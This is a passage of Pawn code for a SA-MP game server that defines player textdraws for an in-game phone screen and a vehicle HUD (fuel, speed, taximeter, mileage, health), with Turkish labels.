	qwe[playerid][4] = CreatePlayerTextDraw(playerid, 591.953491, 374.266876, "LD_POOL:ball");
	PlayerTextDrawLetterSize(playerid, qwe[playerid][4], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, qwe[playerid][4], 9.434350, 15.823307);
	PlayerTextDrawAlignment(playerid, qwe[playerid][4], 1);
	PlayerTextDrawColor(playerid, qwe[playerid][4], 255);
	PlayerTextDrawSetShadow(playerid, qwe[playerid][4], 0);
	PlayerTextDrawSetOutline(playerid, qwe[playerid][4], 0);
	PlayerTextDrawBackgroundColor(playerid, qwe[playerid][4], 255);
	PlayerTextDrawFont(playerid, qwe[playerid][4], 4);
	PlayerTextDrawSetProportional(playerid, qwe[playerid][4], 0);
	PlayerTextDrawSetShadow(playerid, qwe[playerid][4], 0);

	qwe[playerid][5] = CreatePlayerTextDraw(playerid, 511.110595, 226.449752, "box");
	PlayerTextDrawLetterSize(playerid, qwe[playerid][5], 0.000000, 15.326469);
	PlayerTextDrawTextSize(playerid, qwe[playerid][5], 596.991577, 0.000000);
	PlayerTextDrawAlignment(playerid, qwe[playerid][5], 1);
	PlayerTextDrawColor(playerid, qwe[playerid][5], -1);
	PlayerTextDrawUseBox(playerid, qwe[playerid][5], 1);
	PlayerTextDrawBoxColor(playerid, qwe[playerid][5], 1635811583);
	PlayerTextDrawSetShadow(playerid, qwe[playerid][5], 0);
	PlayerTextDrawSetOutline(playerid, qwe[playerid][5], 0);
	PlayerTextDrawBackgroundColor(playerid, qwe[playerid][5], 255);
	PlayerTextDrawFont(playerid, qwe[playerid][5], 1);
	PlayerTextDrawSetProportional(playerid, qwe[playerid][5], 1);
	PlayerTextDrawSetShadow(playerid, qwe[playerid][5], 0);

	qwe[playerid][6] = CreatePlayerTextDraw(playerid, 545.738586, 208.283294, "-----");
	PlayerTextDrawLetterSize(playerid, qwe[playerid][6], 0.305826, 1.261666);
	PlayerTextDrawAlignment(playerid, qwe[playerid][6], 1);
	PlayerTextDrawColor(playerid, qwe[playerid][6], -2139062017);
	PlayerTextDrawSetShadow(playerid, qwe[playerid][6], 0);
	PlayerTextDrawSetOutline(playerid, qwe[playerid][6], -4);
	PlayerTextDrawBackgroundColor(playerid, qwe[playerid][6], 0);
	PlayerTextDrawFont(playerid, qwe[playerid][6], 1);
	PlayerTextDrawSetProportional(playerid, qwe[playerid][6], 1);
	PlayerTextDrawSetShadow(playerid, qwe[playerid][6], 0);

	qwe[playerid][7] = CreatePlayerTextDraw(playerid, 538.654052, 213.399917, "LD_POOL:ball");
	PlayerTextDrawLetterSize(playerid, qwe[playerid][7], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, qwe[playerid][7], 3.749125, 4.066679);
	PlayerTextDrawAlignment(playerid, qwe[playerid][7], 1);
	PlayerTextDrawColor(playerid, qwe[playerid][7], -2139062017);
	PlayerTextDrawSetShadow(playerid, qwe[playerid][7], 0);
	PlayerTextDrawSetOutline(playerid, qwe[playerid][7], 0);
	PlayerTextDrawBackgroundColor(playerid, qwe[playerid][7], 255);
	PlayerTextDrawFont(playerid, qwe[playerid][7], 4);
	PlayerTextDrawSetProportional(playerid, qwe[playerid][7], 0);
	PlayerTextDrawSetShadow(playerid, qwe[playerid][7], 0);

	qwe[playerid][8] = CreatePlayerTextDraw(playerid, 551.523559, 207.933212, "LD_POOL:ball");
	PlayerTextDrawLetterSize(playerid, qwe[playerid][8], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, qwe[playerid][8], 2.746540, 3.026679);
	PlayerTextDrawAlignment(playerid, qwe[playerid][8], 1);
	PlayerTextDrawColor(playerid, qwe[playerid][8], -2139062017);
	PlayerTextDrawSetShadow(playerid, qwe[playerid][8], 0);
	PlayerTextDrawSetOutline(playerid, qwe[playerid][8], 0);
	PlayerTextDrawBackgroundColor(playerid, qwe[playerid][8], 255);
	PlayerTextDrawFont(playerid, qwe[playerid][8], 4);
	PlayerTextDrawSetProportional(playerid, qwe[playerid][8], 0);
	PlayerTextDrawSetShadow(playerid, qwe[playerid][8], 0);

	qwe[playerid][9] = CreatePlayerTextDraw(playerid, 546.418762, 370.099822, "LD_POOL:ball");
	PlayerTextDrawLetterSize(playerid, qwe[playerid][9], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, qwe[playerid][9], 14.886602, 17.090002);
	PlayerTextDrawAlignment(playerid, qwe[playerid][9], 1);
	PlayerTextDrawColor(playerid, qwe[playerid][9], 6878207);
	PlayerTextDrawSetShadow(playerid, qwe[playerid][9], 0);
	PlayerTextDrawSetOutline(playerid, qwe[playerid][9], 0);
	PlayerTextDrawBackgroundColor(playerid, qwe[playerid][9], 255);
	PlayerTextDrawFont(playerid, qwe[playerid][9], 4);
	PlayerTextDrawSetProportional(playerid, qwe[playerid][9], 0);
	PlayerTextDrawSetShadow(playerid, qwe[playerid][9], 0);

	qwe[playerid][10] = CreatePlayerTextDraw(playerid, 519.457641, 373.299987, "LD_OTB2:butnA");
	PlayerTextDrawLetterSize(playerid, qwe[playerid][10], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, qwe[playerid][10], 13.742538, 14.186655);
	PlayerTextDrawAlignment(playerid, qwe[playerid][10], 1);
	PlayerTextDrawColor(playerid, qwe[playerid][10], 1140785232);
	PlayerTextDrawSetShadow(playerid, qwe[playerid][10], 0);
	PlayerTextDrawSetOutline(playerid, qwe[playerid][10], 0);
	PlayerTextDrawBackgroundColor(playerid, qwe[playerid][10], 255);
	PlayerTextDrawFont(playerid, qwe[playerid][10], 4);
	PlayerTextDrawSetProportional(playerid, qwe[playerid][10], 0);
	PlayerTextDrawSetShadow(playerid, qwe[playerid][10], 0);

	qwe[playerid][11] = CreatePlayerTextDraw(playerid, 574.539306, 373.216674, "LD_OTB2:butnA");
	PlayerTextDrawLetterSize(playerid, qwe[playerid][11], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, qwe[playerid][11], 13.742538, 14.186655);
	PlayerTextDrawAlignment(playerid, qwe[playerid][11], 1);
	PlayerTextDrawColor(playerid, qwe[playerid][11], 1996488959);
	PlayerTextDrawSetShadow(playerid, qwe[playerid][11], 0);
	PlayerTextDrawSetOutline(playerid, qwe[playerid][11], 0);
	PlayerTextDrawBackgroundColor(playerid, qwe[playerid][11], 255);
	PlayerTextDrawFont(playerid, qwe[playerid][11], 4);
	PlayerTextDrawSetProportional(playerid, qwe[playerid][11], 0);
	PlayerTextDrawSetShadow(playerid, qwe[playerid][11], 0);

	qwe[playerid][12] = CreatePlayerTextDraw(playerid, 511.042175, 346.384704, "altbar");
	PlayerTextDrawLetterSize(playerid, qwe[playerid][12], 0.000000, 2.023838);
	PlayerTextDrawTextSize(playerid, qwe[playerid][12], 597.091125, 0.000000);
	PlayerTextDrawAlignment(playerid, qwe[playerid][12], 1);
	PlayerTextDrawColor(playerid, qwe[playerid][12], -16776961);
	PlayerTextDrawUseBox(playerid, qwe[playerid][12], 1);
	PlayerTextDrawBoxColor(playerid, qwe[playerid][12], 80);
	PlayerTextDrawSetShadow(playerid, qwe[playerid][12], 0);
	PlayerTextDrawSetOutline(playerid, qwe[playerid][12], 0);
	PlayerTextDrawBackgroundColor(playerid, qwe[playerid][12], 255);
	PlayerTextDrawFont(playerid, qwe[playerid][12], 1);
	PlayerTextDrawSetProportional(playerid, qwe[playerid][12], 1);
	PlayerTextDrawSetShadow(playerid, qwe[playerid][12], 0);

	qwe[playerid][13] = CreatePlayerTextDraw(playerid, 509.073486, 224.400009, "ld_shtr:bstars");
	PlayerTextDrawLetterSize(playerid, qwe[playerid][13], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, qwe[playerid][13], 89.844718, 119.333091);
	PlayerTextDrawAlignment(playerid, qwe[playerid][13], 1);
	PlayerTextDrawColor(playerid, qwe[playerid][13], -65281);
	PlayerTextDrawSetShadow(playerid, qwe[playerid][13], 0);
	PlayerTextDrawSetOutline(playerid, qwe[playerid][13], 0);
	PlayerTextDrawBackgroundColor(playerid, qwe[playerid][13], 255);
	PlayerTextDrawFont(playerid, qwe[playerid][13], 4);
	PlayerTextDrawSetProportional(playerid, qwe[playerid][13], 0);
	PlayerTextDrawSetShadow(playerid, qwe[playerid][13], 0);

	qwe[playerid][14] = CreatePlayerTextDraw(playerid, 514.304016, 346.833221, "LD_OTB2:butnA");
	PlayerTextDrawLetterSize(playerid, qwe[playerid][14], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, qwe[playerid][14], 16.733669, 23.480005);
	PlayerTextDrawAlignment(playerid, qwe[playerid][14], 1);
	PlayerTextDrawColor(playerid, qwe[playerid][14], 9830224);
	PlayerTextDrawSetShadow(playerid, qwe[playerid][14], 0);
	PlayerTextDrawSetOutline(playerid, qwe[playerid][14], 0);
	PlayerTextDrawBackgroundColor(playerid, qwe[playerid][14], 255);
	PlayerTextDrawFont(playerid, qwe[playerid][14], 4);
	PlayerTextDrawSetProportional(playerid, qwe[playerid][14], 0);
	PlayerTextDrawSetShadow(playerid, qwe[playerid][14], 0);
	PlayerTextDrawSetSelectable(playerid, qwe[playerid][14], 1);

	qwe[playerid][15] = CreatePlayerTextDraw(playerid, 517.458312, 351.449951, "123");
	PlayerTextDrawLetterSize(playerid, qwe[playerid][15], 0.178467, 0.911665);
	PlayerTextDrawAlignment(playerid, qwe[playerid][15], 1);
	PlayerTextDrawColor(playerid, qwe[playerid][15], 1224736767);
	PlayerTextDrawSetShadow(playerid, qwe[playerid][15], 0);
	PlayerTextDrawSetOutline(playerid, qwe[playerid][15], 1);
	PlayerTextDrawBackgroundColor(playerid, qwe[playerid][15], 255);
	PlayerTextDrawFont(playerid, qwe[playerid][15], 3);
	PlayerTextDrawSetProportional(playerid, qwe[playerid][15], 1);
	PlayerTextDrawSetShadow(playerid, qwe[playerid][15], 0);

	qwe[playerid][16] = CreatePlayerTextDraw(playerid, 552.509277, 241.333374, "19:45");
	PlayerTextDrawLetterSize(playerid, qwe[playerid][16], 0.473089, 2.194998);
	PlayerTextDrawAlignment(playerid, qwe[playerid][16], 2);
	PlayerTextDrawColor(playerid, qwe[playerid][16], -1);
	PlayerTextDrawSetShadow(playerid, qwe[playerid][16], 0);
	PlayerTextDrawSetOutline(playerid, qwe[playerid][16], 0);
	PlayerTextDrawBackgroundColor(playerid, qwe[playerid][16], 255);
	PlayerTextDrawFont(playerid, qwe[playerid][16], 3);
	PlayerTextDrawSetProportional(playerid, qwe[playerid][16], 1);
	PlayerTextDrawSetShadow(playerid, qwe[playerid][16], 0);

	qwe[playerid][17] = CreatePlayerTextDraw(playerid, 552.038208, 261.016571, "20_ARALIK");
	PlayerTextDrawLetterSize(playerid, qwe[playerid][17], 0.157802, 0.942498);
	PlayerTextDrawAlignment(playerid, qwe[playerid][17], 2);
	PlayerTextDrawColor(playerid, qwe[playerid][17], -1);
	PlayerTextDrawSetShadow(playerid, qwe[playerid][17], 0);
	PlayerTextDrawSetOutline(playerid, qwe[playerid][17], 2);
	PlayerTextDrawBackgroundColor(playerid, qwe[playerid][17], 268435456);
	PlayerTextDrawFont(playerid, qwe[playerid][17], 2);
	PlayerTextDrawSetProportional(playerid, qwe[playerid][17], 1);
	PlayerTextDrawSetShadow(playerid, qwe[playerid][17], 0);

	qwe[playerid][18] = CreatePlayerTextDraw(playerid, 554.057556, 289.016601, "0_yeni_mesaj~n~0_cevapsiz_cagri");
	PlayerTextDrawLetterSize(playerid, qwe[playerid][18], 0.170166, 0.888333);
	PlayerTextDrawTextSize(playerid, qwe[playerid][18], 0.000000, 85.970520);
	PlayerTextDrawAlignment(playerid, qwe[playerid][18], 2);
	PlayerTextDrawColor(playerid, qwe[playerid][18], -1);
	PlayerTextDrawUseBox(playerid, qwe[playerid][18], 1);
	PlayerTextDrawBoxColor(playerid, qwe[playerid][18], -1879041281);
	PlayerTextDrawSetShadow(playerid, qwe[playerid][18], 0);
	PlayerTextDrawSetOutline(playerid, qwe[playerid][18], 1);
	PlayerTextDrawBackgroundColor(playerid, qwe[playerid][18], 268435456);
	PlayerTextDrawFont(playerid, qwe[playerid][18], 1);
	PlayerTextDrawSetProportional(playerid, qwe[playerid][18], 1);
	PlayerTextDrawSetShadow(playerid, qwe[playerid][18], 0);

	qwe[playerid][19] = CreatePlayerTextDraw(playerid, 577.268249, 346.833221, "LD_OTB2:butnA");
	PlayerTextDrawLetterSize(playerid, qwe[playerid][19], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, qwe[playerid][19], 16.733669, 23.480005);
	PlayerTextDrawAlignment(playerid, qwe[playerid][19], 1);
	PlayerTextDrawColor(playerid, qwe[playerid][19], 9830224);
	PlayerTextDrawSetShadow(playerid, qwe[playerid][19], 0);
	PlayerTextDrawSetOutline(playerid, qwe[playerid][19], 0);
	PlayerTextDrawBackgroundColor(playerid, qwe[playerid][19], 255);
	PlayerTextDrawFont(playerid, qwe[playerid][19], 4);
	PlayerTextDrawSetProportional(playerid, qwe[playerid][19], 0);
	PlayerTextDrawSetShadow(playerid, qwe[playerid][19], 0);
	PlayerTextDrawSetSelectable(playerid, qwe[playerid][19], 1);

	qwe[playerid][20] = CreatePlayerTextDraw(playerid, 580.783081, 340.300506, "...");
	PlayerTextDrawLetterSize(playerid, qwe[playerid][20], 0.250728, 1.863332);
	PlayerTextDrawAlignment(playerid, qwe[playerid][20], 1);
	PlayerTextDrawColor(playerid, qwe[playerid][20], -1);
	PlayerTextDrawSetShadow(playerid, qwe[playerid][20], 0);
	PlayerTextDrawSetOutline(playerid, qwe[playerid][20], 5);
	PlayerTextDrawBackgroundColor(playerid, qwe[playerid][20], 0);
	PlayerTextDrawFont(playerid, qwe[playerid][20], 3);
	PlayerTextDrawSetProportional(playerid, qwe[playerid][20], 1);
	PlayerTextDrawSetShadow(playerid, qwe[playerid][20], 0);

	qwe[playerid][21] = CreatePlayerTextDraw(playerid, 580.783081, 344.900787, "...");
	PlayerTextDrawLetterSize(playerid, qwe[playerid][21], 0.250728, 1.863332);
	PlayerTextDrawAlignment(playerid, qwe[playerid][21], 1);
	PlayerTextDrawColor(playerid, qwe[playerid][21], -1);
	PlayerTextDrawSetShadow(playerid, qwe[playerid][21], 0);
	PlayerTextDrawSetOutline(playerid, qwe[playerid][21], 5);
	PlayerTextDrawBackgroundColor(playerid, qwe[playerid][21], 0);
	PlayerTextDrawFont(playerid, qwe[playerid][21], 3);
	PlayerTextDrawSetProportional(playerid, qwe[playerid][21], 1);
	PlayerTextDrawSetShadow(playerid, qwe[playerid][21], 0);

	qwe[playerid][22] = CreatePlayerTextDraw(playerid, 556.473327, 346.833221, "LD_OTB2:butnA");
	PlayerTextDrawLetterSize(playerid, qwe[playerid][22], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, qwe[playerid][22], 16.733669, 23.480005);
	PlayerTextDrawAlignment(playerid, qwe[playerid][22], 1);
	PlayerTextDrawColor(playerid, qwe[playerid][22], 9830224);
	PlayerTextDrawSetShadow(playerid, qwe[playerid][22], 0);
	PlayerTextDrawSetOutline(playerid, qwe[playerid][22], 0);
	PlayerTextDrawBackgroundColor(playerid, qwe[playerid][22], 255);
	PlayerTextDrawFont(playerid, qwe[playerid][22], 4);
	PlayerTextDrawSetProportional(playerid, qwe[playerid][22], 0);
	PlayerTextDrawSetShadow(playerid, qwe[playerid][22], 0);
	PlayerTextDrawSetSelectable(playerid, qwe[playerid][22], 1);

	qwe[playerid][23] = CreatePlayerTextDraw(playerid, 535.378479, 346.833221, "LD_OTB2:butnA");
	PlayerTextDrawLetterSize(playerid, qwe[playerid][23], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, qwe[playerid][23], 16.733669, 23.480005);
	PlayerTextDrawAlignment(playerid, qwe[playerid][23], 1);
	PlayerTextDrawColor(playerid, qwe[playerid][23], 9830224);
	PlayerTextDrawSetShadow(playerid, qwe[playerid][23], 0);
	PlayerTextDrawSetOutline(playerid, qwe[playerid][23], 0);
	PlayerTextDrawBackgroundColor(playerid, qwe[playerid][23], 255);
	PlayerTextDrawFont(playerid, qwe[playerid][23], 4);
	PlayerTextDrawSetProportional(playerid, qwe[playerid][23], 0);
	PlayerTextDrawSetShadow(playerid, qwe[playerid][23], 0);
	PlayerTextDrawSetSelectable(playerid, qwe[playerid][23], 1);

	qwe[playerid][24] = CreatePlayerTextDraw(playerid, 538.953552, 351.700073, "hud:radar_RYDER");
	PlayerTextDrawLetterSize(playerid, qwe[playerid][24], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, qwe[playerid][24], 8.462846, 8.703289);
	PlayerTextDrawAlignment(playerid, qwe[playerid][24], 1);
	PlayerTextDrawColor(playerid, qwe[playerid][24], -1);
	PlayerTextDrawSetShadow(playerid, qwe[playerid][24], 0);
	PlayerTextDrawSetOutline(playerid, qwe[playerid][24], 0);
	PlayerTextDrawBackgroundColor(playerid, qwe[playerid][24], 255);
	PlayerTextDrawFont(playerid, qwe[playerid][24], 4);
	PlayerTextDrawSetProportional(playerid, qwe[playerid][24], 0);
	PlayerTextDrawSetShadow(playerid, qwe[playerid][24], 0);

	qwe[playerid][25] = CreatePlayerTextDraw(playerid, 511.005218, 226.634765, "ustbar");
	PlayerTextDrawLetterSize(playerid, qwe[playerid][25], 0.000000, 0.535798);
	PlayerTextDrawTextSize(playerid, qwe[playerid][25], 597.053833, 0.000000);
	PlayerTextDrawAlignment(playerid, qwe[playerid][25], 1);
	PlayerTextDrawColor(playerid, qwe[playerid][25], -16776961);
	PlayerTextDrawUseBox(playerid, qwe[playerid][25], 1);
	PlayerTextDrawBoxColor(playerid, qwe[playerid][25], -1812267184);
	PlayerTextDrawSetShadow(playerid, qwe[playerid][25], 0);
	PlayerTextDrawSetOutline(playerid, qwe[playerid][25], 0);
	PlayerTextDrawBackgroundColor(playerid, qwe[playerid][25], 255);
	PlayerTextDrawFont(playerid, qwe[playerid][25], 1);
	PlayerTextDrawSetProportional(playerid, qwe[playerid][25], 1);
	PlayerTextDrawSetShadow(playerid, qwe[playerid][25], 0);

	qwe[playerid][26] = CreatePlayerTextDraw(playerid, 595.334533, 229.983398, "box");
	PlayerTextDrawLetterSize(playerid, qwe[playerid][26], 0.000000, -0.049203);
	PlayerTextDrawTextSize(playerid, qwe[playerid][26], 594.895019, 0.000000);
	PlayerTextDrawAlignment(playerid, qwe[playerid][26], 1);
	PlayerTextDrawColor(playerid, qwe[playerid][26], -1);
	PlayerTextDrawUseBox(playerid, qwe[playerid][26], 1);
	PlayerTextDrawBoxColor(playerid, qwe[playerid][26], 16711935);
	PlayerTextDrawSetShadow(playerid, qwe[playerid][26], 0);
	PlayerTextDrawSetOutline(playerid, qwe[playerid][26], 0);
	PlayerTextDrawBackgroundColor(playerid, qwe[playerid][26], 255);
	PlayerTextDrawFont(playerid, qwe[playerid][26], 1);
	PlayerTextDrawSetProportional(playerid, qwe[playerid][26], 1);
	PlayerTextDrawSetShadow(playerid, qwe[playerid][26], 0);

	qwe[playerid][27] = CreatePlayerTextDraw(playerid, 595.934387, 229.083343, "box");
	PlayerTextDrawLetterSize(playerid, qwe[playerid][27], 0.000000, -0.311464);
	PlayerTextDrawTextSize(playerid, qwe[playerid][27], 594.175537, 0.000000);
	PlayerTextDrawAlignment(playerid, qwe[playerid][27], 1);
	PlayerTextDrawColor(playerid, qwe[playerid][27], -1);
	PlayerTextDrawUseBox(playerid, qwe[playerid][27], 1);
	PlayerTextDrawBoxColor(playerid, qwe[playerid][27], 16711935);
	PlayerTextDrawSetShadow(playerid, qwe[playerid][27], 0);
	PlayerTextDrawSetOutline(playerid, qwe[playerid][27], 0);
	PlayerTextDrawBackgroundColor(playerid, qwe[playerid][27], 255);
	PlayerTextDrawFont(playerid, qwe[playerid][27], 1);
	PlayerTextDrawSetProportional(playerid, qwe[playerid][27], 1);
	PlayerTextDrawSetShadow(playerid, qwe[playerid][27], 0);

	qwe[playerid][28] = CreatePlayerTextDraw(playerid, 586.920898, 225.399749, "%100");
	PlayerTextDrawLetterSize(playerid, qwe[playerid][28], 0.096074, 0.628332);
	PlayerTextDrawAlignment(playerid, qwe[playerid][28], 2);
	PlayerTextDrawColor(playerid, qwe[playerid][28], -1);
	PlayerTextDrawSetShadow(playerid, qwe[playerid][28], 0);
	PlayerTextDrawSetOutline(playerid, qwe[playerid][28], 1);
	PlayerTextDrawBackgroundColor(playerid, qwe[playerid][28], 0);
	PlayerTextDrawFont(playerid, qwe[playerid][28], 2);
	PlayerTextDrawSetProportional(playerid, qwe[playerid][28], 1);
	PlayerTextDrawSetShadow(playerid, qwe[playerid][28], 0);

	qwe[playerid][29] = CreatePlayerTextDraw(playerid, 511.342285, 221.666809, ".....");
	PlayerTextDrawLetterSize(playerid, qwe[playerid][29], 0.214928, 1.104166);
	PlayerTextDrawAlignment(playerid, qwe[playerid][29], 1);
	PlayerTextDrawColor(playerid, qwe[playerid][29], -1);
	PlayerTextDrawSetShadow(playerid, qwe[playerid][29], 0);
	PlayerTextDrawSetOutline(playerid, qwe[playerid][29], 0);
	PlayerTextDrawBackgroundColor(playerid, qwe[playerid][29], 255);
	PlayerTextDrawFont(playerid, qwe[playerid][29], 1);
	PlayerTextDrawSetProportional(playerid, qwe[playerid][29], 1);
	PlayerTextDrawSetShadow(playerid, qwe[playerid][29], 0);

	qwe[playerid][30] = CreatePlayerTextDraw(playerid, 524.997924, 226.083374, "AT&T");
	PlayerTextDrawLetterSize(playerid, qwe[playerid][30], 0.091963, 0.622500);
	PlayerTextDrawAlignment(playerid, qwe[playerid][30], 1);
	PlayerTextDrawColor(playerid, qwe[playerid][30], -1);
	PlayerTextDrawSetShadow(playerid, qwe[playerid][30], 0);
	PlayerTextDrawSetOutline(playerid, qwe[playerid][30], 0);
	PlayerTextDrawBackgroundColor(playerid, qwe[playerid][30], 0);
	PlayerTextDrawFont(playerid, qwe[playerid][30], 2);
	PlayerTextDrawSetProportional(playerid, qwe[playerid][30], 1);
	PlayerTextDrawSetShadow(playerid, qwe[playerid][30], 0);

	qwe[playerid][31] = CreatePlayerTextDraw(playerid, 547.318420, 371.316619, "LD_NONE:light");
	PlayerTextDrawLetterSize(playerid, qwe[playerid][31], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, qwe[playerid][31], 13.211048, 14.583353);
	PlayerTextDrawAlignment(playerid, qwe[playerid][31], 1);
	PlayerTextDrawColor(playerid, qwe[playerid][31], -1);
	PlayerTextDrawSetShadow(playerid, qwe[playerid][31], 0);
	PlayerTextDrawSetOutline(playerid, qwe[playerid][31], 0);
	PlayerTextDrawBackgroundColor(playerid, qwe[playerid][31], 255);
	PlayerTextDrawFont(playerid, qwe[playerid][31], 4);
	PlayerTextDrawSetProportional(playerid, qwe[playerid][31], 0);
	PlayerTextDrawSetShadow(playerid, qwe[playerid][31], 0);
	PlayerTextDrawSetSelectable(playerid, qwe[playerid][31], 1);

	qwe[playerid][32] = CreatePlayerTextDraw(playerid, 558.716857, 351.333251, "Mm");
	PlayerTextDrawLetterSize(playerid, qwe[playerid][32], 0.211998, 1.007498);
	PlayerTextDrawAlignment(playerid, qwe[playerid][32], 1);
	PlayerTextDrawColor(playerid, qwe[playerid][32], -838902785);
	PlayerTextDrawSetShadow(playerid, qwe[playerid][32], 0);
	PlayerTextDrawSetOutline(playerid, qwe[playerid][32], -1);
	PlayerTextDrawBackgroundColor(playerid, qwe[playerid][32], 255);
	PlayerTextDrawFont(playerid, qwe[playerid][32], 1);
	PlayerTextDrawSetProportional(playerid, qwe[playerid][32], 1);
	PlayerTextDrawSetShadow(playerid, qwe[playerid][32], 0);

	qwe[playerid][33] = CreatePlayerTextDraw(playerid, 540.453186, 351.700073, "hud:radar_RYDER");
	PlayerTextDrawLetterSize(playerid, qwe[playerid][33], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, qwe[playerid][33], 8.462846, 8.703289);
	PlayerTextDrawAlignment(playerid, qwe[playerid][33], 1);
	PlayerTextDrawColor(playerid, qwe[playerid][33], -5298177);
	PlayerTextDrawSetShadow(playerid, qwe[playerid][33], 0);
	PlayerTextDrawSetOutline(playerid, qwe[playerid][33], 0);
	PlayerTextDrawBackgroundColor(playerid, qwe[playerid][33], 255);
	PlayerTextDrawFont(playerid, qwe[playerid][33], 4);
	PlayerTextDrawSetProportional(playerid, qwe[playerid][33], 0);
	PlayerTextDrawSetShadow(playerid, qwe[playerid][33], 0);

    SilahTD[playerid] = CreatePlayerTextDraw(playerid, 1.529405, 422.166900, "~y~~h~|~w~Weapon Name");
	PlayerTextDrawLetterSize(playerid, SilahTD[playerid], 0.200000, 1.299999);
	PlayerTextDrawTextSize(playerid, SilahTD[playerid], 98.000000, 0.000000);
	PlayerTextDrawAlignment(playerid, SilahTD[playerid], 1);
	PlayerTextDrawColor(playerid, SilahTD[playerid], -1);
	PlayerTextDrawUseBox(playerid, SilahTD[playerid], 1);
	PlayerTextDrawBoxColor(playerid, SilahTD[playerid], 170);
	PlayerTextDrawSetShadow(playerid, SilahTD[playerid], 1);
	PlayerTextDrawSetOutline(playerid, SilahTD[playerid], -1);
	PlayerTextDrawBackgroundColor(playerid, SilahTD[playerid], 255);
	PlayerTextDrawFont(playerid, SilahTD[playerid], 2);
	PlayerTextDrawSetProportional(playerid, SilahTD[playerid], 1);

    SS[playerid] = CreatePlayerTextDraw(playerid, 0.000000, 0.000000, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, SS[playerid], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, SS[playerid], 640.000000, 448.000000);
	PlayerTextDrawAlignment(playerid, SS[playerid], 1);
	PlayerTextDrawColor(playerid, SS[playerid], 255);
	PlayerTextDrawSetShadow(playerid, SS[playerid], 0);
	PlayerTextDrawSetOutline(playerid, SS[playerid], 0);
	PlayerTextDrawFont(playerid, SS[playerid], 4);

	BenzinTD[playerid] = CreatePlayerTextDraw(playerid, 493.766845, 439.229797, "99.9lt");
	PlayerTextDrawLetterSize(playerid, BenzinTD[playerid], 0.140000, 0.744962);
	PlayerTextDrawAlignment(playerid, BenzinTD[playerid], 1);
	PlayerTextDrawColor(playerid, BenzinTD[playerid], -10270721);
	PlayerTextDrawSetShadow(playerid, BenzinTD[playerid], 0);
	PlayerTextDrawSetOutline(playerid, BenzinTD[playerid], -2);
	PlayerTextDrawBackgroundColor(playerid, BenzinTD[playerid], 255);
	PlayerTextDrawFont(playerid, BenzinTD[playerid], 1);
	PlayerTextDrawSetProportional(playerid, BenzinTD[playerid], 1);
	PlayerTextDrawSetShadow(playerid, BenzinTD[playerid], 0);

	HizTD[playerid] = CreatePlayerTextDraw(playerid, 474.166625, 438.359222, "200km/h");
	PlayerTextDrawLetterSize(playerid, HizTD[playerid], 0.107333, 0.886518);
	PlayerTextDrawAlignment(playerid, HizTD[playerid], 1);
	PlayerTextDrawColor(playerid, HizTD[playerid], 1182971135);
	PlayerTextDrawSetShadow(playerid, HizTD[playerid], 0);
	PlayerTextDrawSetOutline(playerid, HizTD[playerid], -2);
	PlayerTextDrawBackgroundColor(playerid, HizTD[playerid], 255);
	PlayerTextDrawFont(playerid, HizTD[playerid], 1);
	PlayerTextDrawSetProportional(playerid, HizTD[playerid], 1);
	PlayerTextDrawSetShadow(playerid, HizTD[playerid], 0);

	TaksimetreTD[playerid] = CreatePlayerTextDraw(playerid, 511.900207, 416.244415, "$0");
	PlayerTextDrawLetterSize(playerid, TaksimetreTD[playerid], 0.163666, 0.698666);
	PlayerTextDrawAlignment(playerid, TaksimetreTD[playerid], 1);
	PlayerTextDrawColor(playerid, TaksimetreTD[playerid], 579543807);
	PlayerTextDrawSetShadow(playerid, TaksimetreTD[playerid], 0);
	PlayerTextDrawSetOutline(playerid, TaksimetreTD[playerid], -1);
	PlayerTextDrawBackgroundColor(playerid, TaksimetreTD[playerid], 255);
	PlayerTextDrawFont(playerid, TaksimetreTD[playerid], 1);
	PlayerTextDrawSetProportional(playerid, TaksimetreTD[playerid], 1);
	PlayerTextDrawSetShadow(playerid, TaksimetreTD[playerid], 0);

	KmTD[playerid] = CreatePlayerTextDraw(playerid, 511.333404, 438.888977, "5000km");
	PlayerTextDrawLetterSize(playerid, KmTD[playerid], 0.110333, 0.782814);
	PlayerTextDrawAlignment(playerid, KmTD[playerid], 1);
	PlayerTextDrawColor(playerid, KmTD[playerid], -320017153);
	PlayerTextDrawSetShadow(playerid, KmTD[playerid], 0);
	PlayerTextDrawSetOutline(playerid, KmTD[playerid], -2);
	PlayerTextDrawBackgroundColor(playerid, KmTD[playerid], 255);
	PlayerTextDrawFont(playerid, KmTD[playerid], 1);
	PlayerTextDrawSetProportional(playerid, KmTD[playerid], 1);
	PlayerTextDrawSetShadow(playerid, KmTD[playerid], 0);

    GeriSayimTD[playerid] = CreatePlayerTextDraw(playerid,568.588439, 367.333251, "100");
	PlayerTextDrawLetterSize(playerid,GeriSayimTD[playerid], 0.499, 2.499);
	PlayerTextDrawAlignment(playerid,GeriSayimTD[playerid], 1);
	PlayerTextDrawColor(playerid,GeriSayimTD[playerid], 0x880000FF);
	PlayerTextDrawSetShadow(playerid,GeriSayimTD[playerid], 0);
	PlayerTextDrawSetOutline(playerid,GeriSayimTD[playerid], 1);
	PlayerTextDrawBackgroundColor(playerid,GeriSayimTD[playerid], 255);
	PlayerTextDrawFont(playerid,GeriSayimTD[playerid], 3);
	PlayerTextDrawSetProportional(playerid,GeriSayimTD[playerid], 1);
	PlayerTextDrawSetShadow(playerid,GeriSayimTD[playerid], 0);

	CanTD[playerid] = CreatePlayerTextDraw(playerid, 543.000122, 428.103759, "100");
	PlayerTextDrawLetterSize(playerid, CanTD[playerid], 0.209666, 0.940444);
	PlayerTextDrawAlignment(playerid, CanTD[playerid], 1);
